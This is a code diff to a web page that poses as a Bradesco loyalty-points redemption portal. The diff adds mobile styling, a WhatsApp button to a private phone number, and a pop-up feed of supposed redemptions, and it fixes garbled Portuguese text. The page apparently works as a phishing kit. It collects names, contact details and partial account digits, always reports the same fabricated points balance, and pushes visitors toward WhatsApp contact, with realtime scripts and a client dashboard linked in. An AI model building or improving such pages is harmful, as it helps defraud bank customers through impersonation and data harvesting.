@@ -25,6 +25,10 @@
       box-sizing: border-box;
     }
 
+    * {
+      min-width: 0;
+    }
+
     html {
       scroll-behavior: smooth;
     }
@@ -33,6 +37,7 @@
       margin: 0;
       background: var(--bg);
       color: var(--ink);
+      overflow-x: hidden;
     }
 
     body.splash-active {
@@ -92,6 +97,11 @@
       font: inherit;
     }
 
+    img,
+    svg {
+      max-width: 100%;
+    }
+
     .container {
       width: min(1180px, calc(100% - 32px));
       margin: 0 auto;
@@ -144,6 +154,8 @@
     .nav {
       display: flex;
       align-items: center;
+      flex-wrap: wrap;
+      justify-content: center;
       gap: 4px;
       color: #334155;
       font-size: 0.93rem;
@@ -163,6 +175,7 @@
       justify-content: center;
       padding: 0 14px;
       border-radius: 7px;
+      white-space: nowrap;
       transition: color 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
     }
 
@@ -244,7 +257,7 @@
     .hero-inner {
       min-height: 620px;
       display: grid;
-      grid-template-columns: minmax(0, 1fr) 430px;
+      grid-template-columns: minmax(0, 1fr) minmax(340px, 430px);
       gap: 34px;
       align-items: center;
       padding: 70px 0 84px;
@@ -305,6 +318,7 @@
       display: flex;
       flex-direction: column;
       justify-content: space-between;
+      min-width: 0;
     }
 
     .trust-panel h2 {
@@ -478,6 +492,7 @@
       background: var(--panel);
       box-shadow: var(--shadow);
       animation: riseIn 0.5s ease both;
+      overflow: hidden;
     }
 
     .quiz-stage {
@@ -563,6 +578,7 @@
       color: var(--ink);
       outline: none;
       transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      min-width: 0;
     }
 
     .input:focus {
@@ -679,7 +695,7 @@
 
     .slider {
       position: relative;
-      min-height: 420px;
+      min-height: clamp(300px, 42vw, 420px);
       border-radius: 8px;
       overflow: hidden;
       box-shadow: var(--shadow);
@@ -895,6 +911,87 @@
       font-size: 0.9rem;
     }
 
+    .whatsapp-float {
+      position: fixed;
+      right: 22px;
+      bottom: 22px;
+      z-index: 60;
+      width: 58px;
+      height: 58px;
+      border-radius: 999px;
+      display: grid;
+      place-items: center;
+      background: #25d366;
+      color: #fff;
+      box-shadow: 0 18px 36px rgba(37, 211, 102, 0.32);
+      opacity: 0;
+      pointer-events: none;
+      transform: translateY(12px) scale(0.96);
+      transition: opacity 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .whatsapp-float.show {
+      opacity: 1;
+      pointer-events: auto;
+      transform: translateY(0) scale(1);
+    }
+
+    .whatsapp-float:hover {
+      transform: translateY(-2px) scale(1);
+      box-shadow: 0 22px 44px rgba(37, 211, 102, 0.4);
+    }
+
+    .whatsapp-float svg {
+      width: 31px;
+      height: 31px;
+      fill: currentColor;
+    }
+
+    .redemption-feed {
+      position: fixed;
+      left: 12px;
+      bottom: 12px;
+      z-index: 55;
+      display: grid;
+      gap: 8px;
+      width: min(300px, calc(100vw - 24px));
+      pointer-events: none;
+    }
+
+    .redemption-toast {
+      display: grid;
+      gap: 4px;
+      padding: 10px 12px;
+      border: 1px solid rgba(200, 24, 54, 0.16);
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.96);
+      color: var(--ink);
+      box-shadow: 0 18px 42px rgba(23, 32, 42, 0.18);
+      animation: toastIn 0.35s ease both;
+    }
+
+    .redemption-toast.hide {
+      animation: toastOut 0.28s ease both;
+    }
+
+    .redemption-toast small {
+      color: var(--brand);
+      font-size: 0.66rem;
+      font-weight: 850;
+      text-transform: uppercase;
+    }
+
+    .redemption-toast strong {
+      color: #101828;
+      font-size: 0.86rem;
+      line-height: 1.35;
+    }
+
+    .redemption-toast span {
+      color: var(--muted);
+      font-size: 0.75rem;
+    }
+
     @keyframes riseIn {
       from {
         opacity: 0;
@@ -938,18 +1035,50 @@
       }
     }
 
+    @keyframes toastIn {
+      from {
+        opacity: 0;
+        transform: translateY(12px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes toastOut {
+      to {
+        opacity: 0;
+        transform: translateY(12px);
+      }
+    }
+
     @media (max-width: 980px) {
       .header-inner {
         align-items: flex-start;
         flex-direction: column;
         padding: 16px 0;
+        gap: 14px;
       }
 
       .nav {
         width: 100%;
-        overflow-x: auto;
-        padding-bottom: 4px;
-        justify-content: flex-start;
+        display: grid;
+        grid-template-columns: repeat(3, minmax(0, 1fr));
+        overflow: visible;
+        justify-content: center;
+      }
+
+      .nav a {
+        white-space: normal;
+        text-align: center;
+        padding: 8px 10px;
+        line-height: 1.2;
+      }
+
+      .site-header .btn {
+        width: 100%;
       }
 
       .hero-inner,
@@ -962,6 +1091,15 @@
         min-height: auto;
       }
 
+      .steps {
+        display: grid;
+        grid-template-columns: repeat(4, minmax(0, 1fr));
+      }
+
+      .step-item {
+        flex-direction: column;
+      }
+
       .cards-grid {
         grid-template-columns: repeat(2, minmax(0, 1fr));
       }
@@ -972,9 +1110,122 @@
         width: min(100% - 24px, 1180px);
       }
 
+      .site-header {
+        position: sticky;
+        background: rgba(255, 255, 255, 0.98);
+      }
+
+      .header-inner {
+        align-items: stretch;
+        min-height: auto;
+        padding: 12px 0 14px;
+        gap: 12px;
+      }
+
+      .brand {
+        justify-content: center;
+      }
+
+      .brand-mark {
+        width: 36px;
+        height: 36px;
+        border-radius: 7px;
+      }
+
+      .site-header .btn {
+        min-height: 42px;
+      }
+
+      .nav {
+        display: flex;
+        flex-wrap: nowrap;
+        overflow-x: auto;
+        justify-content: center;
+        gap: 6px;
+        padding: 6px;
+        background: #fff;
+        scrollbar-width: none;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .nav::-webkit-scrollbar {
+        display: none;
+      }
+
+      .nav a {
+        min-height: 36px;
+        border: 1px solid transparent;
+        background: #f8fafc;
+        font-size: 0.84rem;
+        flex: 0 0 auto;
+        min-width: max-content;
+        padding: 0 14px;
+        white-space: nowrap;
+      }
+
+      .nav a[href="clientes.html"] {
+        display: none;
+      }
+
+      .hero {
+        background:
+          linear-gradient(180deg, rgba(16, 24, 40, 0.86), rgba(89, 19, 40, 0.84)),
+          url("https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=900&q=80") center/cover;
+      }
+
       .hero-inner {
         min-height: auto;
-        padding: 54px 0 64px;
+        padding: 18px 0 44px;
+        gap: 18px;
+      }
+
+      .hero-inner > div:first-child {
+        text-align: center;
+        transform: translateY(-22px);
+      }
+
+      h1 {
+        margin-bottom: 16px;
+        font-size: clamp(2.05rem, 12vw, 3rem);
+        line-height: 1.04;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero-copy,
+      .section-head p,
+      .showcase-copy p {
+        font-size: 0.98rem;
+      }
+
+      .hero-copy {
+        margin-bottom: 22px;
+        line-height: 1.58;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero-actions {
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .trust-panel {
+        min-height: auto;
+        padding: 18px;
+        background: rgba(255, 255, 255, 0.16);
+      }
+
+      .trust-panel h2 {
+        font-size: 1.18rem;
+      }
+
+      .metric-grid {
+        gap: 10px;
+      }
+
+      .metric {
+        padding: 14px;
       }
 
       .hero-actions,
@@ -993,17 +1244,140 @@
         grid-template-columns: 1fr;
       }
 
+      .steps {
+        grid-template-columns: 1fr;
+        padding: 10px;
+      }
+
+      .step-item {
+        flex-direction: row;
+        align-items: center;
+        padding: 12px;
+      }
+
       .quiz-card {
-        padding: 22px;
+        min-height: auto;
+        padding: 20px;
+      }
+
+      .quiz-stage h3 {
+        font-size: 1.28rem;
+      }
+
+      .field-group {
+        margin: 18px 0;
+      }
+
+      .input {
+        min-height: 50px;
+      }
+
+      .choice {
+        min-height: auto;
+        padding: 16px;
+      }
+
+      .instant-callout {
+        padding: 18px;
+      }
+
+      .instant-badge {
+        width: 100%;
+      }
+
+      .slider {
+        min-height: 300px;
+      }
+
+      .slide {
+        padding: 20px;
+      }
+
+      .slide-content h3 {
+        font-size: 1.35rem;
       }
 
       section {
-        padding: 64px 0;
+        padding: 54px 0;
+      }
+
+      .section-head {
+        margin-bottom: 24px;
+      }
+
+      .section-head h2,
+      .showcase-copy h2 {
+        font-size: clamp(1.65rem, 9vw, 2.35rem);
+      }
+
+      .card {
+        min-height: auto;
+        padding: 18px;
       }
 
       .footer-inner {
         align-items: flex-start;
         flex-direction: column;
+      }
+
+      .whatsapp-float {
+        right: 16px;
+        bottom: 16px;
+        width: 54px;
+        height: 54px;
+      }
+
+      .redemption-feed {
+        left: 8px;
+        right: auto;
+        bottom: 8px;
+        width: min(270px, calc(100vw - 16px));
+      }
+
+      .redemption-toast {
+        padding: 9px 11px;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .container {
+        width: min(100% - 20px, 1180px);
+      }
+
+      .nav {
+        display: flex;
+        justify-content: flex-start;
+      }
+
+      .brand-name {
+        font-size: 1rem;
+      }
+
+      .hero-inner {
+        padding: 16px 0 38px;
+      }
+
+      .eyebrow {
+        width: 100%;
+        justify-content: center;
+        text-align: center;
+        font-size: 0.78rem;
+      }
+
+      .quiz-card,
+      .steps,
+      .instant-callout,
+      .card {
+        padding: 16px;
+      }
+
+      .points-box {
+        padding: 18px;
+      }
+
+      .footer-links {
+        flex-direction: column;
+        gap: 10px;
       }
     }
   </style>
@@ -1024,11 +1398,10 @@
       </a>
 
       <nav class="nav" aria-label="Menu principal">
-        <a href="#inicio">InÃƒÂ­cio</a>
+        <a href="#inicio">Início</a>
         <a href="#como-funciona">Como Funciona</a>
-        <a href="#beneficios">BenefÃƒÂ­cios</a>
-        <a href="#faq">DÃƒÂºvidas Frequentes</a>
-        <a href="#atendimento">Atendimento</a>
+        <a href="#beneficios">Benefícios</a>
+        <a href="#faq">Dúvidas</a>
         <a href="clientes.html">Dashboard</a>
       </nav>
 
@@ -1040,33 +1413,33 @@
     <section class="hero" aria-label="Portal de Resgate">
       <div class="container hero-inner">
         <div>
-          <span class="eyebrow">Bradesco Pontos Ã¢â‚¬â€ Portal de Resgate</span>
+          <span class="eyebrow">Bradesco Pontos — Portal de Resgate</span>
           <h1>Resgate pontos acumulados recentemente</h1>
           <p class="hero-copy">
-            Agora vocÃƒÂª pode receber orientaÃƒÂ§ÃƒÂ£o sobre o resgate de pontos acumulados recentemente
-            atravÃƒÂ©s deste canal de atendimento exclusivo para correntistas Bradesco. Os pontos
-            podem ser consultados para opÃƒÂ§ÃƒÂµes de resgate em territÃƒÂ³rio nacional e internacional,
-            incluindo passagens, produtos e benefÃƒÂ­cios selecionados.
+            Agora você pode receber orientação sobre o resgate de pontos acumulados recentemente
+            através deste canal de atendimento exclusivo para correntistas Bradesco. Os pontos
+            podem ser consultados para opções de resgate em território nacional e internacional,
+            incluindo passagens, produtos e benefícios selecionados.
           </p>
           <div class="hero-actions">
             <a class="btn btn-primary" href="#como-funciona">Consultar Agora</a>
-            <a class="btn btn-secondary" href="#beneficios">Ver benefÃƒÂ­cios</a>
+            <a class="btn btn-secondary" href="#beneficios">Ver benefícios</a>
           </div>
         </div>
 
-        <aside class="trust-panel" aria-label="OpÃƒÂ§ÃƒÂµes de resgate">
+        <aside class="trust-panel" aria-label="Opções de resgate">
           <div>
             <h2>Use seus pontos em novas possibilidades</h2>
-            <p>Consulte pontos acumulados recentemente e veja opÃƒÂ§ÃƒÂµes de troca por passagens aÃƒÂ©reas, produtos em lojas fÃƒÂ­sicas e benefÃƒÂ­cios selecionados.</p>
+            <p>Consulte pontos acumulados recentemente e veja opções de troca por passagens aéreas, produtos em lojas físicas e benefícios selecionados.</p>
           </div>
           <div class="metric-grid">
             <div class="metric">
               <strong>Passagens</strong>
-              <span>orientaÃƒÂ§ÃƒÂ£o para trocar pontos por viagens e experiÃƒÂªncias</span>
+              <span>orientação para trocar pontos por viagens e experiências</span>
             </div>
             <div class="metric">
               <strong>Produtos</strong>
-              <span>opÃƒÂ§ÃƒÂµes para uso em lojas fÃƒÂ­sicas e parceiros elegÃƒÂ­veis</span>
+              <span>opções para uso em lojas físicas e parceiros elegíveis</span>
             </div>
             <div class="metric">
               <strong>Resgate</strong>
@@ -1081,27 +1454,27 @@
       <div class="container">
         <div class="section-head">
           <div class="section-kicker">Fluxo seguro</div>
-          <h2>Informe apenas o necessÃƒÂ¡rio para iniciar o atendimento</h2>
-          <p>Este fluxo direciona sua solicitaÃƒÂ§ÃƒÂ£o de resgate de pontos acumulados recentemente. A autenticaÃƒÂ§ÃƒÂ£o ÃƒÂ© realizada automaticamente e, caso precise de ajuda, vocÃƒÂª tambÃƒÂ©m pode contar com nosso suporte.</p>
+          <h2>Informe apenas o necessário para iniciar o atendimento</h2>
+          <p>Este fluxo direciona sua solicitação de resgate de pontos acumulados recentemente. A autenticação é realizada automaticamente e, caso precise de ajuda, você também pode contar com nosso suporte.</p>
         </div>
 
         <div class="instant-callout">
           <div>
             <strong>Consulte seus pontos agora</strong>
-            <p>Preencha as informaÃƒÂ§ÃƒÂµes abaixo para iniciar a consulta imediata dos pontos disponÃƒÂ­veis para resgate.</p>
+            <p>Preencha as informações abaixo para iniciar a consulta imediata dos pontos disponíveis para resgate.</p>
           </div>
           <span class="instant-badge">Consulta na hora</span>
         </div>
 
         <div class="quiz-wrap">
-          <aside class="steps" aria-label="Etapas do formulÃƒÂ¡rio">
+          <aside class="steps" aria-label="Etapas do formulário">
             <div class="step-item active" data-step-label="1">
               <span class="step-number">1</span>
-              <div><strong>Tipo de cliente</strong><span>Pessoa FÃƒÂ­sica ou JurÃƒÂ­dica</span></div>
+              <div><strong>Tipo de cliente</strong><span>Pessoa Física ou Jurídica</span></div>
             </div>
             <div class="step-item" data-step-label="2">
               <span class="step-number">2</span>
-              <div><strong>IdentificaÃƒÂ§ÃƒÂ£o</strong><span>Nome e canal de contato</span></div>
+              <div><strong>Identificação</strong><span>Nome e canal de contato</span></div>
             </div>
             <div class="step-item" data-step-label="3">
               <span class="step-number">3</span>
@@ -1109,57 +1482,57 @@
             </div>
             <div class="step-item" data-step-label="4">
               <span class="step-number">4</span>
-              <div><strong>Consulta</strong><span>Pontos disponÃƒÂ­veis</span></div>
+              <div><strong>Consulta</strong><span>Pontos disponíveis</span></div>
             </div>
           </aside>
 
           <form class="quiz-card" id="secureQuiz">
             <div class="quiz-stage active" data-step="1">
-              <h3>Qual ÃƒÂ© o tipo de cliente?</h3>
-              <p>Essa informaÃƒÂ§ÃƒÂ£o ajuda a direcionar o atendimento sem solicitar documentos completos.</p>
+              <h3>Qual é o tipo de cliente?</h3>
+              <p>Essa informação ajuda a direcionar o atendimento sem solicitar documentos completos.</p>
               <div class="choice-grid">
-                <button class="choice" type="button" data-field="cliente" data-value="Pessoa FÃƒÂ­sica">
-                  <strong>Pessoa FÃƒÂ­sica</strong>
-                  <span>OrientaÃƒÂ§ÃƒÂ£o para clientes individuais com cartÃƒÂ£o de crÃƒÂ©dito.</span>
+                <button class="choice" type="button" data-field="cliente" data-value="Pessoa Física">
+                  <strong>Pessoa Física</strong>
+                  <span>Orientação para clientes individuais com cartão de crédito.</span>
                 </button>
-                <button class="choice" type="button" data-field="cliente" data-value="Pessoa JurÃƒÂ­dica">
-                  <strong>Pessoa JurÃƒÂ­dica</strong>
-                  <span>OrientaÃƒÂ§ÃƒÂ£o para empresas e cartÃƒÂµes corporativos.</span>
+                <button class="choice" type="button" data-field="cliente" data-value="Pessoa Jurídica">
+                  <strong>Pessoa Jurídica</strong>
+                  <span>Orientação para empresas e cartões corporativos.</span>
                 </button>
               </div>
             </div>
 
             <div class="quiz-stage" data-step="2">
               <h3>Identifique-se para atendimento</h3>
-              <p id="identificacaoTexto">Informe seus dados de identificaÃƒÂ§ÃƒÂ£o e um canal de contato para dar continuidade ao atendimento.</p>
+              <p id="identificacaoTexto">Informe seus dados de identificação e um canal de contato para dar continuidade ao atendimento.</p>
               <div class="field-group">
                 <label class="field-label" for="nomeCliente" id="nomeClienteLabel">Nome completo</label>
                 <input class="input" id="nomeCliente" name="nomeCliente" type="text" autocomplete="name" placeholder="Digite seu nome completo">
-                <span class="field-hint">Use apenas a identificaÃƒÂ§ÃƒÂ£o necessÃƒÂ¡ria para atendimento.</span>
+                <span class="field-hint">Use apenas a identificação necessária para atendimento.</span>
               </div>
               <div class="field-group">
                 <label class="field-label" for="contato">E-mail ou telefone</label>
                 <input class="input" id="contato" name="contato" type="text" autocomplete="off" placeholder="exemplo@email.com ou (00) 00000-0000">
-                <span class="field-hint">A confirmaÃƒÂ§ÃƒÂ£o oficial deve ocorrer em canal seguro e autorizado.</span>
+                <span class="field-hint">A confirmação oficial deve ocorrer em canal seguro e autorizado.</span>
               </div>
               <div class="field-group">
-                <label class="field-label" for="identificadorSeguro">IdentificaÃƒÂ§ÃƒÂ£o parcial</label>
-                <input class="input" id="identificadorSeguro" name="identificadorSeguro" type="text" inputmode="numeric" maxlength="12" autocomplete="off" placeholder="ÃƒÅ¡ltimos 4 dÃƒÂ­gitos da conta ou protocolo">
-                <span class="field-hint">Use apenas uma referÃƒÂªncia parcial para localizar o atendimento.</span>
+                <label class="field-label" for="identificadorSeguro">Identificação parcial</label>
+                <input class="input" id="identificadorSeguro" name="identificadorSeguro" type="text" inputmode="numeric" maxlength="12" autocomplete="off" placeholder="Últimos 4 dígitos da conta ou protocolo">
+                <span class="field-hint">Use apenas uma referência parcial para localizar o atendimento.</span>
               </div>
             </div>
 
             <div class="quiz-stage" data-step="3">
-              <h3>Qual ÃƒÂ© o perfil de atendimento?</h3>
+              <h3>Qual é o perfil de atendimento?</h3>
               <p>Selecione o relacionamento e a categoria desejada para direcionar a consulta de pontos acumulados recentemente.</p>
               <div class="choice-grid">
                 <button class="choice" type="button" data-field="segmento" data-value="Net Empresas">
                   <strong>Net Empresas</strong>
                   <span>Atendimento para perfil empresarial.</span>
                 </button>
-                <button class="choice" type="button" data-field="segmento" data-value="Bradesco FÃƒÂ­sico">
-                  <strong>Bradesco FÃƒÂ­sico</strong>
-                  <span>Atendimento para cliente pessoa fÃƒÂ­sica.</span>
+                <button class="choice" type="button" data-field="segmento" data-value="Bradesco Físico">
+                  <strong>Bradesco Físico</strong>
+                  <span>Atendimento para cliente pessoa física.</span>
                 </button>
                 <button class="choice" type="button" data-field="segmento" data-value="Bradesco Prime">
                   <strong>Bradesco Prime</strong>
@@ -1167,7 +1540,7 @@
                 </button>
               </div>
               <h3>Categoria de resgate</h3>
-              <p>Escolha a opÃƒÂ§ÃƒÂ£o de resgate que deseja consultar.</p>
+              <p>Escolha a opção de resgate que deseja consultar.</p>
               <div class="choice-grid">
                 <button class="choice" type="button" data-field="categoria" data-value="Produtos">
                   <strong>Produtos</strong>
@@ -1175,22 +1548,22 @@
                 </button>
                 <button class="choice" type="button" data-field="categoria" data-value="Viagens">
                   <strong>Viagens</strong>
-                  <span>Passagens, hospedagens e experiÃƒÂªncias.</span>
+                  <span>Passagens, hospedagens e experiências.</span>
                 </button>
                 <button class="choice" type="button" data-field="categoria" data-value="Cashback">
                   <strong>Cashback</strong>
-                  <span>Possibilidades de crÃƒÂ©dito ou abatimento.</span>
+                  <span>Possibilidades de crédito ou abatimento.</span>
                 </button>
                 <button class="choice" type="button" data-field="categoria" data-value="Gift Cards">
                   <strong>Gift Cards</strong>
-                  <span>Vales digitais em lojas e serviÃƒÂ§os parceiros.</span>
+                  <span>Vales digitais em lojas e serviços parceiros.</span>
                 </button>
               </div>
             </div>
 
             <div class="quiz-stage" data-step="4">
               <h3 id="consultaTitulo">Consultando pontos acumulados</h3>
-              <p id="consultaTexto">Aguarde enquanto verificamos as informaÃƒÂ§ÃƒÂµes do atendimento.</p>
+              <p id="consultaTexto">Aguarde enquanto verificamos as informações do atendimento.</p>
               <div class="loading-panel" id="loadingPanel">
                 <div class="loading-row">
                   <span class="spinner" aria-hidden="true"></span>
@@ -1203,7 +1576,7 @@
               <div class="result-panel" id="resultPanel" hidden>
                 <div class="points-box">
                   <strong>38.982 pontos</strong>
-                  <p>Foram localizados pontos disponÃƒÂ­veis para resgate. ApÃƒÂ³s a confirmaÃƒÂ§ÃƒÂ£o no aplicativo oficial, o prazo estimado para crÃƒÂ©dito em conta ÃƒÂ© de atÃƒÂ© 24 horas.</p>
+                  <p>Foram localizados pontos disponíveis para resgate. Após a confirmação no aplicativo oficial, o prazo estimado para crédito em conta é de até 24 horas.</p>
                 </div>
                 <div class="alert-box" id="summaryBox">
                   Para prosseguir com o atendimento, clique em Resgatar Agora.
@@ -1223,9 +1596,9 @@
     <section id="beneficios">
       <div class="container">
         <div class="section-head">
-          <div class="section-kicker">BenefÃƒÂ­cios</div>
-          <h2>Uma experiÃƒÂªncia clara para consultar e resgatar</h2>
-          <p>O portal centraliza orientaÃƒÂ§ÃƒÂµes e categorias, preparando o usuÃƒÂ¡rio para concluir o acesso em ambiente oficial.</p>
+          <div class="section-kicker">Benefícios</div>
+          <h2>Uma experiência clara para consultar e resgatar</h2>
+          <p>O portal centraliza orientações e categorias, preparando o usuário para concluir o acesso em ambiente oficial.</p>
         </div>
 
         <div class="cards-grid">
@@ -1240,7 +1613,7 @@
               </svg>
             </div>
             <h3>Resgate simples</h3>
-            <p>Organize preferÃƒÂªncias e veja caminhos de resgate de forma objetiva.</p>
+            <p>Organize preferências e veja caminhos de resgate de forma objetiva.</p>
           </article>
           <article class="card">
             <div class="icon" aria-hidden="true">
@@ -1251,7 +1624,7 @@
                 <path d="M11 8v6"></path>
               </svg>
             </div>
-            <h3>Consulta rÃƒÂ¡pida</h3>
+            <h3>Consulta rápida</h3>
             <p>Fluxo direto, responsivo e orientado por etapas curtas.</p>
           </article>
           <article class="card">
@@ -1265,8 +1638,8 @@
                 <circle cx="10" cy="17" r="2"></circle>
               </svg>
             </div>
-            <h3>OpÃƒÂ§ÃƒÂµes variadas</h3>
-            <p>Produtos, viagens, cashback e gift cards em uma jornada ÃƒÂºnica.</p>
+            <h3>Opções variadas</h3>
+            <p>Produtos, viagens, cashback e gift cards em uma jornada única.</p>
           </article>
           <article class="card">
             <div class="icon" aria-hidden="true">
@@ -1288,31 +1661,31 @@
       <div class="container showcase">
         <div class="showcase-copy">
           <div class="section-kicker">Resgates em destaque</div>
-          <h2>Troque pontos por viagens aÃƒÂ©reas e produtos eletrÃƒÂ´nicos</h2>
-          <p>Consulte suas opÃƒÂ§ÃƒÂµes de resgate para passagens, experiÃƒÂªncias de viagem e produtos em lojas fÃƒÂ­sicas ou parceiras selecionadas.</p>
+          <h2>Troque pontos por viagens aéreas e produtos eletrônicos</h2>
+          <p>Consulte suas opções de resgate para passagens, experiências de viagem e produtos em lojas físicas ou parceiras selecionadas.</p>
           <a class="btn btn-primary" href="#como-funciona">Consultar pontos</a>
         </div>
 
         <div class="slider" aria-label="Imagens de resgate de pontos">
           <article class="slide active" style="background-image: url('https://images.unsplash.com/photo-1436491865332-7a61a109cc05?auto=format&fit=crop&w=1400&q=80');">
             <div class="slide-content">
-              <strong>Viagens aÃƒÂ©reas</strong>
-              <h3>Use pontos para planejar sua prÃƒÂ³xima viagem</h3>
-              <p>Veja possibilidades de troca por passagens e experiÃƒÂªncias conforme disponibilidade.</p>
+              <strong>Viagens aéreas</strong>
+              <h3>Use pontos para planejar sua próxima viagem</h3>
+              <p>Veja possibilidades de troca por passagens e experiências conforme disponibilidade.</p>
             </div>
           </article>
           <article class="slide" style="background-image: url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=1400&q=80');">
             <div class="slide-content">
-              <strong>EletrÃƒÂ´nicos</strong>
+              <strong>Eletrônicos</strong>
               <h3>Produtos para usar no dia a dia</h3>
-              <p>Consulte opÃƒÂ§ÃƒÂµes de troca por eletrÃƒÂ´nicos, acessÃƒÂ³rios e itens de tecnologia.</p>
+              <p>Consulte opções de troca por eletrônicos, acessórios e itens de tecnologia.</p>
             </div>
           </article>
           <article class="slide" style="background-image: url('https://images.unsplash.com/photo-1488646953014-85cb44e25828?auto=format&fit=crop&w=1400&q=80');">
             <div class="slide-content">
-              <strong>ExperiÃƒÂªncias</strong>
+              <strong>Experiências</strong>
               <h3>Mais alternativas para aproveitar seus pontos</h3>
-              <p>Escolha a categoria desejada e siga para a consulta de pontos disponÃƒÂ­veis.</p>
+              <p>Escolha a categoria desejada e siga para a consulta de pontos disponíveis.</p>
             </div>
           </article>
           <div class="slider-dots" aria-hidden="true">
@@ -1327,9 +1700,9 @@
     <section class="band" id="faq">
       <div class="container">
         <div class="section-head">
-          <div class="section-kicker">DÃƒÂºvidas Frequentes</div>
+          <div class="section-kicker">Dúvidas Frequentes</div>
           <h2>Perguntas comuns sobre pontos e resgate</h2>
-          <p>Respostas gerais para orientar a experiÃƒÂªncia antes da autenticaÃƒÂ§ÃƒÂ£o oficial.</p>
+          <p>Respostas gerais para orientar a experiência antes da autenticação oficial.</p>
         </div>
 
         <div class="faq-list">
@@ -1338,7 +1711,7 @@
               <span>Como consulto meu saldo de pontos?</span>
               <span>+</span>
             </button>
-            <div class="faq-answer">A consulta ÃƒÂ© realizada atravÃƒÂ©s do formulÃƒÂ¡rio e, logo apÃƒÂ³s a autenticaÃƒÂ§ÃƒÂ£o, vocÃƒÂª recebe o suporte de um gerente de atendimento.</div>
+            <div class="faq-answer">A consulta é realizada através do formulário e, logo após a autenticação, você recebe o suporte de um gerente de atendimento.</div>
           </article>
           <article class="faq-item">
             <button class="faq-question" type="button">
@@ -1349,10 +1722,10 @@
           </article>
           <article class="faq-item">
             <button class="faq-question" type="button">
-              <span>Qual ÃƒÂ© o prazo para concluir um resgate?</span>
+              <span>Qual é o prazo para concluir um resgate?</span>
               <span>+</span>
             </button>
-            <div class="faq-answer">Prazos variam conforme categoria, parceiro e validaÃƒÂ§ÃƒÂ£o do programa. A confirmaÃƒÂ§ÃƒÂ£o deve ser consultada no suporte.</div>
+            <div class="faq-answer">Prazos variam conforme categoria, parceiro e validação do programa. A confirmação deve ser consultada no suporte.</div>
           </article>
         </div>
       </div>
@@ -1363,7 +1736,7 @@
         <div class="section-head">
           <div class="section-kicker">Atendimento</div>
           <h2>Consulte seus pontos acumulados recentes</h2>
-          <p>Pontos acumulados recentemente poderÃƒÂ£o ser consultados imediatamente atravÃƒÂ©s da identificaÃƒÂ§ÃƒÂ£o no botÃƒÂ£o Consultar Agora, em um breve formulÃƒÂ¡rio de atendimento.</p>
+          <p>Pontos acumulados recentemente poderão ser consultados imediatamente através da identificação no botão Consultar Agora, em um breve formulário de atendimento.</p>
         </div>
         <a class="btn btn-primary" href="#como-funciona">Consultar Agora</a>
       </div>
@@ -1373,16 +1746,31 @@
   <footer class="site-footer">
     <div class="container footer-inner">
       <div class="footer-links">
-        <a href="#">PolÃƒÂ­tica de Privacidade</a>
+        <a href="#">Política de Privacidade</a>
         <a href="#">Termos de Uso</a>
-        <a href="#">SeguranÃƒÂ§a</a>
+        <a href="#">Segurança</a>
       </div>
     </div>
   </footer>
 
+  <a
+    class="whatsapp-float"
+    href="https://wa.me/5511996896942?text=Ol%C3%A1%2C%20quero%20resgatar%20meus%20pontos%20e%20preciso%20de%20suporte."
+    target="_blank"
+    rel="noopener"
+    aria-label="Falar com suporte no WhatsApp"
+  >
+    <svg viewBox="0 0 32 32" aria-hidden="true">
+      <path d="M16.03 4A11.88 11.88 0 0 0 5.8 21.94L4.5 28l6.18-1.25A11.94 11.94 0 1 0 16.03 4Zm0 21.82a9.78 9.78 0 0 1-4.98-1.36l-.36-.21-3.66.74.77-3.57-.23-.37a9.7 9.7 0 1 1 8.46 4.77Zm5.35-7.31c-.29-.15-1.73-.85-2-.95-.27-.1-.47-.15-.67.15-.2.29-.77.95-.95 1.15-.17.2-.35.22-.64.07-.29-.15-1.24-.46-2.36-1.46-.87-.78-1.46-1.74-1.63-2.03-.17-.29-.02-.45.13-.6.13-.13.29-.35.44-.52.15-.17.2-.29.29-.49.1-.2.05-.37-.02-.52-.07-.15-.67-1.62-.92-2.22-.24-.58-.49-.5-.67-.51h-.57c-.2 0-.52.07-.79.37-.27.29-1.04 1.02-1.04 2.49s1.07 2.89 1.22 3.09c.15.2 2.11 3.22 5.11 4.51.71.31 1.27.49 1.7.63.71.23 1.36.2 1.88.12.57-.08 1.73-.71 1.98-1.39.24-.68.24-1.27.17-1.39-.07-.12-.27-.2-.56-.35Z"/>
+    </svg>
+  </a>
+
+  <div class="redemption-feed" id="redemptionFeed" aria-live="polite" aria-atomic="false"></div>
+
   <script src="firebase-config.js"></script>
   <script src="realtime-config.js"></script>
   <script src="realtime-client.js"></script>
+  <script src="mojibake-fix.js"></script>
   <script>
     const splashScreen = document.querySelector("#splashScreen");
 
@@ -1425,11 +1813,11 @@
     let resultReady = false;
 
     function updateQuiz() {
-      const isPessoaJuridica = state.cliente === "Pessoa JurÃƒÂ­dica";
-      nomeClienteLabel.textContent = isPessoaJuridica ? "RazÃƒÂ£o social" : "Nome completo";
-      nomeClienteInput.placeholder = isPessoaJuridica ? "Digite a razÃƒÂ£o social" : "Digite seu nome completo";
+      const isPessoaJuridica = state.cliente === "Pessoa Jurídica";
+      nomeClienteLabel.textContent = isPessoaJuridica ? "Razão social" : "Nome completo";
+      nomeClienteInput.placeholder = isPessoaJuridica ? "Digite a razão social" : "Digite seu nome completo";
       identificacaoTexto.textContent = isPessoaJuridica
-        ? "Informe a razÃƒÂ£o social e um canal de contato para dar continuidade ao atendimento."
+        ? "Informe a razão social e um canal de contato para dar continuidade ao atendimento."
         : "Informe seu nome completo e um canal de contato para dar continuidade ao atendimento.";
 
       stages.forEach((stage) => {
@@ -1478,7 +1866,7 @@
       const messages = [
         "Consultando pontos...",
         "Verificando compras recentes...",
-        "Ajustando opÃƒÂ§ÃƒÂµes de troca...",
+        "Ajustando opções de troca...",
         "Preparando resultado do resgate..."
       ];
 
@@ -1505,15 +1893,15 @@
 
